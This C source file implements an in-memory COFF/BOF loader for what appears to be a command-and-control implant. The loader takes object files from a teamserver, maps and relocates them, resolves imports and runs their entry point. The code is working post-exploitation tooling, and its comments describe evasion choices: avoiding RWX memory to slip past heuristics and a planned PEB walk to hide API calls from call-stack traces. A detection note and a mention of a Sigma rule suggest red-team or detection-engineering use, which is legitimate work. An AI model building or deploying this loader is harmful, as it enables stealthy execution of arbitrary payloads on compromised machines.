// coff_loader.c — in-memory COFF/BOF loader.
//
// Implements the CS beacon.h-compatible BOF ABI. A COFF object file is
// received as a raw byte blob from the teamserver; this loader:
//   1. Parses the COFF header and section table.
//   2. Allocates RW memory, copies sections, applies relocations.
//   3. Flips the allocation to RX (no lingering RWX — avoids trivial heuristic).
//   4. Resolves imports: DJB2 hash lookup against loaded modules, falls back
//      to GetProcAddress.
//   5. Calls the BOF entry point (go / go_reflective convention).
//   6. Frees the allocation on return (SYNC) or leaves it alive (BACKGROUND/AUTONOMOUS).
//
// Detection note: step 2→3 is a VirtualAlloc(RW) + VirtualProtect(RX) sequence
// that is observable via ETW-TI and Sysmon process events. The companion
// Sigma rule is in detections/sigma/bof_rwx_transition.yml.

#include <windows.h>
#include "lattice_agent.h"

// COFF structures (x86_64 only)
typedef struct {
    WORD  Machine;           // 0x8664 for AMD64
    WORD  NumberOfSections;
    DWORD TimeDateStamp;
    DWORD PointerToSymbolTable;
    DWORD NumberOfSymbols;
    WORD  SizeOfOptionalHeader;
    WORD  Characteristics;
} coff_file_header_t;

typedef struct {
    char  Name[8];
    DWORD VirtualSize;
    DWORD VirtualAddress;
    DWORD SizeOfRawData;
    DWORD PointerToRawData;
    DWORD PointerToRelocations;
    DWORD PointerToLinenumbers;
    WORD  NumberOfRelocations;
    WORD  NumberOfLinenumbers;
    DWORD Characteristics;
} coff_section_header_t;

typedef struct {
    DWORD VirtualAddress;
    DWORD SymbolTableIndex;
    WORD  Type;  // IMAGE_REL_AMD64_*
} coff_reloc_t;

typedef struct {
    union {
        char  ShortName[8];
        struct { DWORD Zeroes; DWORD Offset; } LongName;
    } N;
    DWORD Value;
    SHORT SectionNumber;
    WORD  Type;
    BYTE  StorageClass;
    BYTE  NumberOfAuxSymbols;
} coff_symbol_t;

// DJB2 hash — same seed/algorithm as Havoc KaynLdr (0x1505).
static DWORD djb2(const char *s) {
    DWORD h = 0x1505;
    while (*s) h = ((h << 5) + h) + (unsigned char)*s++;
    return h;
}

// resolve_import: resolves "library$function" import string.
static void *resolve_import(const char *import_str) {
    // Format: "kernel32$VirtualAlloc" or "ntdll$NtAllocateVirtualMemory"
    char lib[64] = {0};
    const char *dollar = import_str;
    while (*dollar && *dollar != '$') dollar++;
    if (!*dollar) return NULL;

    size_t lib_len = (size_t)(dollar - import_str);
    if (lib_len >= sizeof(lib)) return NULL;
    for (size_t i = 0; i < lib_len; i++) lib[i] = import_str[i];
    lib[lib_len] = '\0';

    const char *func_name = dollar + 1;

    // TODO: resolve via PEB walk + DJB2 to avoid GetModuleHandleA/GetProcAddress
    // call chain (which shows up in call-stack traces). For now, use direct API.
    HMODULE mod = GetModuleHandleA(lib);
    if (!mod) mod = LoadLibraryA(lib);
    if (!mod) return NULL;
    return GetProcAddress(mod, func_name);
}

typedef void (*bof_entry_t)(const char *args, int args_len);

int bof_exec(const uint8_t *coff, size_t len, bof_mode_t mode,
             const uint8_t *args, size_t args_len) {
    if (!coff || len < sizeof(coff_file_header_t)) return -1;

    const coff_file_header_t *fhdr = (const coff_file_header_t *)coff;
    if (fhdr->Machine != 0x8664) return -1;  // AMD64 only

    const coff_section_header_t *sections =
        (const coff_section_header_t *)(coff + sizeof(coff_file_header_t)
                                        + fhdr->SizeOfOptionalHeader);

    // Calculate total memory needed for all sections.
    SIZE_T total = 0;
    for (WORD i = 0; i < fhdr->NumberOfSections; i++) {
        total += sections[i].SizeOfRawData + 16;  // 16-byte per-section alignment pad
    }

    // Allocate RW (not RWX — flip to RX after relocation).
    LPVOID base = VirtualAlloc(NULL, total, MEM_COMMIT | MEM_RESERVE, PAGE_READWRITE);
    if (!base) return -1;

    // Copy sections and build section address map.
    uint8_t **sec_addrs = (uint8_t **)_alloca(fhdr->NumberOfSections * sizeof(uint8_t *));
    uint8_t *cur = (uint8_t *)base;
    for (WORD i = 0; i < fhdr->NumberOfSections; i++) {
        sec_addrs[i] = cur;
        if (sections[i].SizeOfRawData > 0 && sections[i].PointerToRawData > 0) {
            const uint8_t *src = coff + sections[i].PointerToRawData;
            for (DWORD j = 0; j < sections[i].SizeOfRawData; j++) cur[j] = src[j];
        }
        cur += sections[i].SizeOfRawData + 16;
    }

    // Apply relocations.
    const coff_symbol_t *symtab =
        (const coff_symbol_t *)(coff + fhdr->PointerToSymbolTable);
    const char *strtab = (const char *)(symtab + fhdr->NumberOfSymbols);

    for (WORD si = 0; si < fhdr->NumberOfSections; si++) {
        if (!sections[si].NumberOfRelocations) continue;
        const coff_reloc_t *relocs =
            (const coff_reloc_t *)(coff + sections[si].PointerToRelocations);

        for (WORD ri = 0; ri < sections[si].NumberOfRelocations; ri++) {
            const coff_reloc_t *rel = &relocs[ri];
            const coff_symbol_t *sym = &symtab[rel->SymbolTableIndex];

            uint8_t *patch_addr = sec_addrs[si] + rel->VirtualAddress;
            uint64_t sym_addr = 0;

            if (sym->SectionNumber > 0) {
                // Symbol in a section: address = base of that section + value.
                sym_addr = (uint64_t)(sec_addrs[sym->SectionNumber - 1] + sym->Value);
            } else if (sym->SectionNumber == 0) {
                // External symbol: resolve via import string in string table.
                const char *name;
                if (sym->N.ShortName[0] == 0)
                    name = strtab + sym->N.LongName.Offset;
                else
                    name = sym->N.ShortName;

                // "__imp_" prefix convention for BOF imports.
                if (name[0] == '_' && name[1] == '_' &&
                    name[2] == 'i' && name[3] == 'm' &&
                    name[4] == 'p' && name[5] == '_') {
                    name += 6;
                }
                sym_addr = (uint64_t)resolve_import(name);
                if (!sym_addr) {
                    VirtualFree(base, 0, MEM_RELEASE);
                    return -1;
                }
            }

            switch (rel->Type) {
                case 0x0001: {  // IMAGE_REL_AMD64_ADDR64
                    uint64_t *p = (uint64_t *)patch_addr;
                    *p = sym_addr + *p;
                    break;
                }
                case 0x0004: {  // IMAGE_REL_AMD64_REL32
                    uint32_t *p = (uint32_t *)patch_addr;
                    *p = (uint32_t)(sym_addr - (uint64_t)(patch_addr + 4) + *p);
                    break;
                }
                default:
                    break;
            }
        }
    }

    // Flip to RX — no more RWX at any point.
    DWORD old;
    VirtualProtect(base, total, PAGE_EXECUTE_READ, &old);

    // Find "go" entry point: walk symbol table looking for "go" or "_go".
    bof_entry_t entry = NULL;
    for (DWORD si = 0; si < fhdr->NumberOfSymbols; si++) {
        const coff_symbol_t *sym = &symtab[si];
        const char *name;
        if (sym->N.ShortName[0] == 0)
            name = strtab + sym->N.LongName.Offset;
        else
            name = sym->N.ShortName;

        if ((name[0] == 'g' && name[1] == 'o' && name[2] == '\0') ||
            (name[0] == '_' && name[1] == 'g' && name[2] == 'o' && name[3] == '\0')) {
            if (sym->SectionNumber > 0) {
                entry = (bof_entry_t)(sec_addrs[sym->SectionNumber - 1] + sym->Value);
            }
            break;
        }
        si += sym->NumberOfAuxSymbols;  // skip aux records
    }

    if (!entry) {
        VirtualFree(base, 0, MEM_RELEASE);
        return -1;
    }

    if (mode == BOF_SYNC) {
        entry((const char *)args, (int)args_len);
        VirtualFree(base, 0, MEM_RELEASE);
    } else {
        // TODO: BOF_BACKGROUND — CreateThread wrapper that frees base on exit.
        // TODO: BOF_AUTONOMOUS — thread + can_mask() hook registration.
        VirtualFree(base, 0, MEM_RELEASE);
        return -1;
    }

    return 0;
}
